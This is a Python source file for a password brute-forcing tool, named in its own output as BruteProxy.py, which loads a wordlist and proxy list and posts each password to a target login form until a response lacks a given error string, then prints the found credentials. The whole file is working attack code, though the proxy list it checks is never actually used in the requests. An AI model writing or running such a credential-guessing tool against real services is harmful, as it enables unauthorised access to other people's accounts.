import requests

class colors:
    HEADER = '\033[95m'
    WHITE = '\033[0m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DARK_CYAN = '\033[90m'

class attacker:

    # convert .txt file to big wordlist and proxylist dictonary
    def generateDicts(self, wordlistPath, proxylistPath):
        # generate wordlist
        a_file = open(wordlistPath, "r")
        attacker.wordlist = [(line.strip()).split() for line in a_file]
        a_file.close()

        # generate proxylist
        b_file = open(proxylistPath, "r")
        attacker.proxylist = [(line.strip()).split() for line in b_file]
        b_file.close()

    def attack(self, target, username, wordlist, proxylist, errIdentfier):
        # set us a simple found flag
        creds_found = False

        # firstly, let's generate some dicts AND error handle this process, since this is very fishy
        try:
            attacker.generateDicts(0, wordlist, proxylist)

            # yay! dicts successfully generated, now let's check one more thing before we get started
            # check if both wordlist and proxylist contains atleast 5 items
            if len(attacker.wordlist) >= 5:
                # wordlist has, now let's look at the proxylist
                if len(attacker.proxylist) >= 5:
                    # now we're really set up to begin the attack!
                    # this process is very fishy too, we must handle that with care
                    try:
                        print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Executing attack, we'll let you know if we find something..." + colors.ENDC)
                        for currentPwdNum in range(0, len(attacker.wordlist)):
                            currentPOSTobj = {"username": username, "password": attacker.wordlist[currentPwdNum]}
                            currentRequest = requests.post(target, data = currentPOSTobj)

                            # request sent, let's evalute the response
                            currentResponse__text = currentRequest.text
                            currentResponse__code = currentRequest.status_code

                            if currentResponse__text.find(errIdentfier) == -1:
                                # YAY! we have got the creds, user will be happy!
                                # set a flag
                                creds_found = True

                                # greet a user with a great news
                                print(colors.OKCYAN + "[" + colors.OKGREEN + colors.BOLD + "\u2713" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "SUCCESS! Correct credentials were found. Enjoy and thank you for using BruteProxy.py :)" + colors.ENDC)
                                print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Username: " + colors.ENDC + username)
                                print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Password: " + colors.ENDC + str(attacker.wordlist[currentPwdNum]))

                                # before we actaully end loop, if the user has not specified or wrongly specified the error identifier, the very first password will popup
                                # as correct, since it did not find that value in response, so we can theoretically detect that and only inform the user about this
                                if currentPwdNum == 0:
                                    print(colors.OKCYAN + "[]" + colors.ENDC)
                                    print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Note that the very first password in wordlist was detected as correct." + colors.ENDC)
                                    print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Please make sure that everything is set up correctly, especially error_identifier." + colors.ENDC)
                                # end loop
                                break
                            else:
                                # this request was unsuccessfull, continue in loop
                                continue

                        # if for was unsuccessful and the creds weren't found, print this
                        if not creds_found:
                            print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "\u2717" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Credentials were not found in wordlist, we're sorry :(" + colors.ENDC)
                    except:
                        print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "There was an unexpected error in main loop, please make sure that everything is set up correctly" + colors.ENDC)
                else:
                    # proxylist too short
                    print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Proxylist is in wrong format or is too short (it must contain atleast 5 items)" + colors.ENDC)
            else:
                # wordlist too short
                print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Wordlist is in wrong format or is too short (it must contain atleast 5 items)" + colors.ENDC)
        except:
            print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Unexpected error, ensure that both files are here and they're in right format" + colors.ENDC)